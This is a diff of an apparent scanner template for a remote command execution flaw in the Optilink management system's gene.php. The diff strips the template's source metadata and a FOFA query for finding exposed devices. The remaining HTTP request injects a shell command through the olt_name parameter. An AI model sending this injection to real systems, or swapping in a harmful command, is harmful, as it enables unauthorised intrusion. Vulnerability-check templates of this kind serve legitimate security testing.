@@ -3,12 +3,8 @@ info:
   name: Optilink管理系统 gene.php 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gsgan12ebuubhlp2'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gsgan12ebuubhlp2
-    fofa: body="/html/css/dxtdata.css" && title="login"
 http:
 - raw:
   - 'GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+123456>%20test112test.txt;%20%23%20 HTTP/1.1
